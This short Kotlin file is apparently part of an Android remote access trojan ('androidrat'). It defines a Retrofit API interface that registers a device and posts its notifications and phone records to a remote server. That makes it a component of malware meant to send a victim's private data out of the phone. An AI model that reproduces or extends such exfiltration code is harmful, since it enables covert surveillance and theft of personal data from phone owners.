package com.nqmgaming.androidrat.data

import com.nqmgaming.androidrat.data.dto.DeviceDto
import com.nqmgaming.androidrat.data.dto.NotificationDto
import okhttp3.ResponseBody
import retrofit2.Call
import retrofit2.http.Body
import retrofit2.http.POST
import retrofit2.http.Streaming

interface ApiService {
    @Streaming
    @POST("devices/register")
    fun register(@Body deviceDto: DeviceDto): Call<ResponseBody>

    @POST("notifications")
    fun postNotification(@Body notificationData: NotificationDto): Call<ResponseBody>

    @POST("phones")
    fun postPhone(@Body phoneDto: List<PhoneDto>): Call<ResponseBody>
}